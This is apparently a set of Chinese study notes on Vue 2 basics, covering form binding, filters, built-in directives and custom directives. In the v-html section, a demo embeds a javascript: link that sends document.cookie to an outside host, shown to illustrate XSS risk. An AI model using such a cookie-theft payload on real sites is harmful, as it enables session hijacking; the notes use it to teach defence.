# Vue基础

## 收集表单数据

### 定义

收集表单数据:

- 若:\<input type="text"/>，则v-model收集的是value值，用户输入的就是value值。
- 若:\<input type="radio"/>，则v-model收集的是value值，且要给标签配置value值。
- 若: \<input type="checkbox"/>
  - 没有配置input的value属性，那么收集的就是checked（勾选or未勾选，是布尔值)
  - 配置input的value属性:
    - v-model的初始值是非数组，那么收集的就是checked（勾选or未勾选，是布尔值)
    - v-model的初始值是数组，那么收集的的就是value组成的数组

- 备注:v-model的三个修饰符:
  - lazy:失去焦点再收集数据
  - number:输入字符串转为有效的数字
  - trim:输入首尾空格过滤

### 案例

```html
<body>
    <!-- 准备一个容器 -->
    <div id='root'>
        <!-- form表单 -->
        <!-- 阻止默认事件，防止页面刷新，导致数据丢失 -->
        <form @submit.prevent='doSubmit'>
            <!-- 点击账号：这个位置时，可以获得input框的焦点 -->
            <!-- <label for="account">账号：</label>
            <input type="text" id="account"/> -->
            <!-- v-model默认收集input框的value值 -->
            <!-- v-model.trim的意思是去掉输入数据的前后空格 -->
            账号：<input type="text" v-model.trim='userInfo.account' />
            <br />
            密码：<input type="text" v-model='userInfo.password' />
            <br />
            <!-- 控制前端只能输入数字 v-model.number的意思是告诉vm这个属性是数字，不要转换为字符串 -->
            年龄：<input type="number" v-model.number='userInfo.age' />
            <br />
            <!-- 单选框，通过name属性控制只能单选 -->
            <!-- 通过给默认value值的方式，使用v-model进行绑定 -->
            性别：
            男<input type="radio" name='sex' v-model='userInfo.sex' value="male" />
            女<input type="radio" name='sex' v-model='userInfo.sex' value="female" />
            <br />
            <!-- 多选框 -->
            爱好：
            <!-- 需要指定value，同时绑定的对象需要是一个数组，否则会默认使用checked（是否勾选）来进行绑定 -->
            <!-- 是否勾选为布尔值，会导致选择一个就把全部都钩上 -->
            学习<input type="checkbox" v-model='userInfo.hobby' value="study" />
            打游戏<input type="checkbox" v-model='userInfo.hobby' value="game" />
            吃饭<input type="checkbox" v-model='userInfo.hobby' value="eat" />
            <br />
            <!-- 下拉框 -->
            所属校区：
            <!-- 选择标签中存在对应的value，直接绑定即可 -->
            <select v-model='userInfo.city'>
                <option value="">请选择校区</option>
                <option value="beijing">北京</option>
                <option value="shanghai">上海</option>
                <option value="shenzhen">深圳</option>
                <option value="wuhan">武汉</option>
            </select>
            <br />

            <!-- v-model.lazy表示失去焦点的时候再收集，而不是实时收集 -->
            其他信息：
            <textarea v-model.lazy='userInfo.other'></textarea>
            <br />

            <!-- 这种场景下只需要知道checked（是否选择）是否为真即可，就不需要用数组接收和绑定value值了 -->
            <input type="checkbox" v-model='userInfo.agree'>阅读并接受<a href="http//www.baidu.com">《用户协议》</a>
            <br />

            <button>提交</button>
        </form>
    </div>

    <script type="text/javascript">
        new Vue({
            el: '#root',
            data: {
                userInfo: {
                    account: null,
                    password: null,
                    // 默认选择'女'
                    sex: 'female',
                    age: null,
                    hobby: [],
                    // 默认选择北京校区
                    city: 'beijing',
                    other: null,
                    agree: false
                }
            },

            methods: {
                doSubmit() {
                    // 将data中的数据全部转换为Json
                    // console.log(JSON.stringify(this._data));
                    // 通过userInfo对象进行输出
                    console.log(JSON.stringify(this.userInfo));
                }
            },
        });
    </script>
</body>
```



测试结果：

![image-20220904233427409](../../../md-photo/image-20220904233427409.png)



### 收集数据事件

#### trim

```html
<!-- v-model.trim的意思是去掉输入数据的前后空格 -->
账号：<input type="text" v-model.trim='userInfo.account' />
<br />
```

![image-20220904232603072](../../../md-photo/image-20220904232603072.png)



#### number

```html
<!-- 控制前端只能输入数字 v-model.number的意思是告诉vm这个属性是数字，不要转换为字符串 -->
年龄：<input type="number" v-model.number='userInfo.age' />
<br />
```

![image-20220904232731200](../../../md-photo/image-20220904232731200.png)



#### lazy

```html
<!-- v-model.lazy表示失去焦点的时候再收集，而不是实时收集 -->
其他信息：
<textarea v-model.lazy='userInfo.other'></textarea>
<br />
```

![image-20220904232846374](../../../md-photo/image-20220904232846374.png)

![image-20220904232940300](../../../md-photo/image-20220904232940300.png)



### 将data中的对象转为json

```javascript
doSubmit() {
    // 将data中的数据全部转换为Json
    // console.log(JSON.stringify(this._data));
    // 通过userInfo对象进行输出
    console.log(JSON.stringify(this.userInfo));
}
```

结果：

![image-20220904233118050](../../../md-photo/image-20220904233118050.png)



## 过滤器

### 定义

- 定义:对要显示的数据进行特定格式化后再显示(适用于一些简单逻辑的处理）。
- 语法:
  - 注册过滤器:Vue.filter(name,callback）或new Vue{filters:{}}
  - 使用过滤器:{{xxx | 过滤器名}或v-bind:属性= "xxx │ 过滤器名"
- 备注:
  - 过滤器也可以接收额外参数、多个过滤器也可以串联
  - 并没有改变原本的数据，是产生新的对应的数据



### 案例

```html
<body>
    <!-- 准备一个容器 -->
    <div id='root'>
        <h1>显示格式化后的时间</h1>
        <!-- 计算属性实现 -->
        <h2>现在是：{{formatTime}}</h2>

        <!-- methods实现 -->
        <h2>现在是：{{getFormatTime()}}</h2>

        <!-- 过滤器实现 -->
        <!-- 无参的过滤器 -->
        <h2>现在是：{{time | timeformatter}}</h2>
        <!-- 有参的过滤器，传入的第一个参数永远是value，不需要再手动写一次 -->
        <h2>现在是：{{time | timeformatter('YYYY-MM-DD')}}</h2>

        <!-- 多个过滤器可以连续使用 -->
        <h2>现在是：{{time | timeformatter('YYYY-MM-DD') | splitYear}}</h2>

        <!-- 可以对标签中的属性使用过滤器 -->
        <h2 :prop='msg | splitYear'>您好，Vue</h2>
    </div>

    <script type="text/javascript">
        // 定义全局的过滤器
        Vue.filter('splitYear', function (val) {
            return val.split('-')[0];
        });

        const vm = new Vue({
            el: '#root',
            data: {
                time: 1662339333748, //时间戳
                msg: '您好-Vue'
            },

            computed: {
                formatTime() {
                    // 这里如果不传入this.time的话，默认取当前的时间戳
                    return dayjs(this.time).format("YYYY/MM/DD HH:mm:ss");
                }
            },

            methods: {
                getFormatTime() {
                    return dayjs(this.time).format("YYYY/MM/DD HH:mm:ss");
                }
            },

            filters: {
                // 这里传入页面的数据，然后返回值会替换页面的数据
                // str = 'YYYY/MM/DD HH:mm:ss'，使用ES6的形参默认值
                timeformatter(val, str = 'YYYY/MM/DD HH:mm:ss') {
                    return dayjs(val).format(str);
                }
            }
        });

    </script>
</body>
```



### 结果

![image-20220905094211009](../../../md-photo/image-20220905094211009.png)





## 内置指令

我们学过的指令:

| 指令    | 作用                             |
| ------- | -------------------------------- |
| v-bind  | 单向绑定解析表达式，可简写为:xxx |
| v-model | 双向数据绑定                     |
| v-for   | 遍历数组/对象/字符串             |
| v-on    | 绑定事件监听，可简写为@          |
| v-if    | 条件渲染（动态控制节点是否存在)  |
| v-else  | 条件渲染（动态控制节点是否存在)  |
| v-show  | 条件渲染（动态控制节点是否展示)  |
|         |                                  |

### v-text指令

- 作用:向其所在的节点中渲染文本内容。
- 与插值语法的区别:v-text会替换掉节点中的内容，{{xx}}则不会。



示例：

```html
<body>
    <!-- 准备一个容器 -->
    <div id='root'>
        <h1>{{name}}</h1>
        <!-- 将属性的所有文本信息替换当前标签的内容 -->
        <h1 v-text='name'></h1>
    </div>

    <script type="text/javascript">
        new Vue({
            el: '#root',
            data: {
                name: '尚硅谷'
            }
        });
    </script>
</body>
```



执行结果：

![image-20220907203831791](../../../md-photo/image-20220907203831791.png)



v-text会替换掉标签中的内容：

```html
<h1 v-text='name'>你好，</h1>
```

![image-20220907204246338](../../../md-photo/image-20220907204246338.png)

v-text不会解析属性中的html元素：

![image-20220907204326062](../../../md-photo/image-20220907204326062.png)



### v-html

#### 定义及案例

- 作用:向指定节点中渲染包含html结构的内容。
  - 与插值语法的区别:
    - v-html会替换掉节点中所有的内容，{{xx}}则不会。
    - v-html可以识别html结构。
  - 严重注意: v-html有安全性问题!!!
    - 在网站上动态渲染任意HTML是非常危险的,容易导致XSS攻击。
    - **<font color='red'>一定要在可信的内容上使用v-html，永不要用在用户提交的内容上</font>**!

相对于v-text来说，v-html可以解析字符串中的html标签：

```html
<body>
    <!-- 准备一个容器 -->
    <div id='root'>
        <!-- 将属性的所有文本信息替换当前标签的内容 -->
        <div v-html='str'></div>
    </div>

    <script type="text/javascript">
        new Vue({
            el: '#root',
            data: {
                str: '<h3>你好啊！</h3>'
            }
        });
    </script>
</body>
```



执行结果：

![image-20220907204528054](../../../md-photo/image-20220907204528054.png)



#### v-html安全问题

cookie的工作流程：

![image-20220907205511790](../../../md-photo/image-20220907205511790.png)



cookie不能跨浏览器使用：

![image-20220907205655420](../../../md-photo/image-20220907205655420.png)



浏览器查看cookie信息：

![image-20220907210016558](../../../md-photo/image-20220907210016558.png)



代码演示：

```html
<body>
    <!-- 准备一个容器 -->
    <div id='root'>
        <!-- 将属性的所有文本信息替换当前标签的内容 -->
        <div v-html='str'></div>

        <div v-html='href'></div>
    </div>

    <script type="text/javascript">
        new Vue({
            el: '#root',
            data: {
                str: '<h3>你好啊！</h3>',
                href: '<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你要的资源了，快来！</a>'
            }
        });
    </script>
</body>
```



结果：

![image-20220907212113101](../../../md-photo/image-20220907212113101.png)



### v-cloak指令

- 本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性。
- 使用css配合v-cloak可以解决网速慢时页面展示出{{xxx}的问题。

降低浏览器的网速：

![image-20220907214109707](../../../md-photo/image-20220907214109707.png)



源代码：

```html
<style>
    /* 属性选择器 */
    [v-cloak] {
        display: none;
    }
</style>

<body>
    <!-- 准备一个容器 -->
    <div id='root'>
        <!-- v-cloak标签在Vue介入之后会被删掉，配置style样式可以避免{{name}}等模板字符出现在页面上 -->
        <div v-cloak>{{name}}</div>
        <!-- 此时引入的js需要在页面生成之后 -->
        <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/vue@2.5.16/dist/vue.js"></script>
    </div>

    <script type="text/javascript">
        new Vue({
            el: '#root',
            data: {
                name: '尚硅谷'
            }
        });
    </script>
</body>
```



效果：

![image-20220907214258264](../../../md-photo/image-20220907214258264.png)



Vue介入的时候展示对应的内容：

![image-20220907214327891](../../../md-photo/image-20220907214327891.png)



### v-once指令

- v-once所在节点在初次动态渲染后，就视为静态内容了。
- 以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能。



源代码：

```html
<body>
    <!-- 准备一个容器 -->
    <div id='root'>
        <h1 v-once>初始化的n值是：{{n}}</h1>
        <h1>当前的n值是：{{n}}</h1>
        <button @click='n++'>点我n+1</button>
    </div>

    <script type="text/javascript">
        new Vue({
            el: '#root',
            data: {
                n: 1
            }
        });
    </script>
</body>
```



执行结果：

![image-20220907215203185](../../../md-photo/image-20220907215203185.png)



### v-pre指令

-  跳过其所在节点的编译过程。
- 可利用它跳过:没有使用指令语法、没有使用插值语法的节点，会加快编译。

源代码：

```html
<body>
    <!-- 准备一个容器 -->
    <div id='root'>
        <h1>Vue其实很简单</h1>
        <h1 v-pre>当前的n值是：{{n}}</h1>
        <button v-pre @click='n++'>点我n+1</button>
    </div>

    <script type="text/javascript">
        new Vue({
            el: '#root',
            data: {
                n: 1
            }
        });
    </script>
</body>
```



结果：

![image-20220907215814091](../../../md-photo/image-20220907215814091.png)



## 自定义指令

### 定义

- 定义语法:

  - 局部指令:

  ```javascript
  new Vue({
      directives:{指令名:配置对象};
  });
  ```

  或者

  ```javascript
  new Vue({
      directives{指令名:回调函数};
  });
  ```

  - 全局指令

  ```javascript
  Vue.directive(指令名,配置对象);
  ```

  或者

  ```javascript
  Vue.directive(指令名,回调函数);
  ```

  

- 配置对象中常用的3个回调

  - bind:指令与元素成功绑定时调用。
  - inserted:指令所在元素被插入页面时调用。
  - update:指令所在模板结构被重新解析时调用。

- 备注

  - 指令定义时不加v-，但使用时要加v-;
  - 指令名如果是多个单词，要使用kebab-case命名方式，不要用camelCase命名。



### 需求

- 定义一个v-big指令，和v-text功能类似，但会把绑定的数值放大10倍。
- 定义一个v-fbind指令，和v-bind功能类似，但可以让其所绑定的input元素默认获取焦点。



### 需求一实例

源代码：

```html
<body>
    <!-- 准备一个容器 -->
    <div id='root'>
        <h1>当前的n值是：<span v-text='n'></span></h1>
        <h1>放大十倍后的n值是：<span v-big='n'></span></h1>
        <button @click='n++'>点我n+1</button>
    </div>

    <script type="text/javascript">
        new Vue({
            el: '#root',
            data: {
                n: 1
            },


            // 自定义指令
            directives: {
                // 将n值放大10倍
                // 什么时候调用？1.指令与元素成功绑定时（一上来时就调用）。2.指令所在的模板重新解析时。
                // 第一参数是真实的DOM元素，这里是span；第二个参数是自定义指令的信息，包括名字、表达式、值等
                big(element, binding) {
                   // console.log(element instanceof HTMLElement);
                   // console.log(element, binding);
                   // 将标签中的值放大10倍
                   element.innerText = binding.value * 10;
                }
            }
        });
    </script>
</body>
```



自定义指令的参数：

![image-20220907221151023](../../../md-photo/image-20220907221151023.png)



执行结果：

![image-20220907221846725](../../../md-photo/image-20220907221846725.png)



### 需求二实例

源代码：

<font color='red'>注意：bind、inserted、update的执行时机。</font>

```html
<body>
    <!-- 准备一个容器 -->
    <div id='root'>
        <input type="text" v-fbind:value='n'>
    </div>

    <script type="text/javascript">
        new Vue({
            el: '#root',
            data: {
                n: 1
            },


            // 自定义指令
            directives: {
                // 自动获取焦点
                // fbind(element, binding) {
                //     element.value = binding.value;
                //     // focus方法执行顺序在input框生成完成之后才奏效。但是[以方法的形式]自定义指定与元素成功绑定时就调用，
                //     // 此时没有生成input框元素，所以导致focus方法失效。所以此时需要[以对象的形式]自定义指定。
                //     element.focus();
                // }

                fbind: {
                    // 指令与元素成功绑定时调用（一上来就调用）
                    bind(element, binding) {
                        // console.log("bind");
                        element.value = binding.value;
                    },

                    // 指令所在的元素插入页面时
                    inserted(element, binding) {
                        // console.log("inserted");
                        element.focus();
                    },

                    // 指令所在的模板被重新解析时
                    update(element, binding) {
                        // console.log("update");
                        element.value = binding.value;
                        // element.focus();
                    }
                }
            }
        });
    </script>
</body>
```



执行结果：

页面初始化时，成功赋予了初始值，并获得了焦点：

![image-20220907224415881](../../../md-photo/image-20220907224415881.png)

模板重新解析时，同时更新了对应的值：

![image-20220907224452062](../../../md-photo/image-20220907224452062.png)

### 避坑指南

boy里面的html标签内容：

```html
<!-- 准备一个容器 -->
<div id='root'>
    <h1>当前的n值是：<span v-text='n'></span></h1>
    <h1>放大十倍后的n值是：<span v-big='n'></span></h1>
    <!-- 指令不能使用驼峰法，风格指南推荐使用-符号隔开 -->
    <h3>放大十倍后的n值是（big-number）：<span v-big-number='n'></span></h3>
    <button @click='n++'>点我n+1</button>
    <br />

    <input type="text" v-fbind:value='n'>
    <br/>
</div>

<div id="root2">
    <button @click='n++'>点我（root2）n+1</button>
    <br/>
    <input type="text" v-fbind:value='n'>
    <br/>
    <h3>放大十倍后的n值是（root2-big-number）：<span v-big-number='n'></span></h3>
</div>
```



#### 指定名字定义问题

指令不能使用驼峰法，风格指南推荐使用-符号隔开

```html
<h3>放大十倍后的n值是（big-number）：<span v-big-number='n'></span></h3>
```

自定义的指令：

```javascript
// 不能使用简写的方式，只能恢复为原来的写法
'big-number'(element, binding) {
    element.innerText = binding.value * 10;
}
```



#### 指令中的this问题

指令中的this是window，如，我们在big指令中添加打印this的操作：

```javascript
big(element, binding) {
    // console.log(element instanceof HTMLElement);
    // console.log(element, binding);
    // 将标签中的值放大10倍
    element.innerText = binding.value * 10;
    // 注意，此处的this是window
    console.log('big的this是：', this);
}
```

打印结果：

![image-20220907230854711](../../../md-photo/image-20220907230854711.png)



#### 可以全局定义指令

使用Vue.directive()方法可以指定全局指令，在多个Vue实例中都可以使用，如我们将两个需求的指定都定义为全局变量：

```javascript
// 定义全局的自定指令，对象的方式
Vue.directive('fbind', {

    // 指令与元素成功绑定时调用（一上来就调用）
    bind(element, binding) {
        // console.log("bind");
        element.value = binding.value;
    },

    // 指令所在的元素插入页面时
    inserted(element, binding) {
        // console.log("inserted");
        element.focus();
    },

    // 指令所在的模板被重新解析时
    update(element, binding) {
        // console.log("update");
        element.value = binding.value;
        // element.focus();
    }
});

// function的方式
Vue.directive('big-number', function(element, binding) {
    element.innerText = binding.value * 10;
});
```



将原来Vue实例中重复的指令注释，并添加一个新的root2实例：

```javascript
new Vue({
    el: '#root2',
    data: {
        n: 1
    }
});
```



测试结果：

![image-20220907231409708](../../../md-photo/image-20220907231409708.png)
